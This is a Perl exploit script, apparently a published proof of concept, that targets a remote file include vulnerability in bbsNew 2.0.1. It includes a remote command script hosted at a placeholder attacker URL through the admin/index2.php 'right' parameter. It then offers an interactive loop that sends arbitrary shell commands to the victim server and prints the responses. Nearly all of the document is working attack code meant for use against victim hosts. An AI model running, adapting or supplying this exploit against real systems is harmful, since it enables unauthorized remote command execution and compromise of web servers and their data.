#!/usr/bin/perl

#################################################################
#                                                               #
#            bbsNew                                             #
#                                                               #
# Class:     Remote File Include Vulnerability                  #
#                                                               #
# Discovered By :     Root3r_H3LL = |)\0073|)\_|-|311           #
#                                                               #
# Original Advisory : http://Www.PersainFox.coM                 #
#                                                               #
# Remote:    Yes                                                #
#                                                               #
# Type:      high                                               #
#                                                               #
#                                                               #
#################################################################


use IO::Socket;
use LWP::Simple;

$cmdshell="http://attacker.com/cmd.txt";   # <====== Change This Line With Your Personal Script

print "\n";
print "#################################################################\n";
print "#                                                               #\n";
print "#   bbsNew =>  2.0.1     Remote File Include Vulnerability      #\n";
print "#            Bug found By : PerSianFox Security                 #\n";
print "#        Email: Root3r_H3LL    Root3r_ir[at]yahoo.com           #\n";
print "#               Web Site : Www.PerSianFox.coM                   #\n";
print "#                We ArE :Root3r_H3LL,Arashrj                    #\n";
print "#                                                               #\n";
print "#                                                               #\n";
print "#                 </\/\\/_ 10\/3 15 1|)\4/\/                    #\n";
print "#                                                               #\n";
print "#################################################################\n";


if (@ARGV < 2)
{
    print "\n Usage: Root3r.pl [host] [path] ";
    print "\n EX : Root3r.pl www.victim.com /[path]/  \n\n";
exit;
}


$host=$ARGV[0];
$path=$ARGV[1];

print "Type Your Commands ( uname -a )\n";
print "For Exiit Type END\n";

print "<Shell> ";$cmd = <STDIN>;

while($cmd !~ "END") {
    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Could not connect to host.\n\n";

    print $socket "GET ".$path."/admin/index2.php?right=".$cmdshell."?cmd=".$cmd."? HTTP/1.1\r\n";
    print $socket "Host: ".$host."\r\n";
    print $socket "Accept: */*\r\n";
    print $socket "Connection: close\r\n\n";

    while ($raspuns = <$socket>)
    {
        print $raspuns;
    }

    print "<Shell> ";
    $cmd = <STDIN>;
}
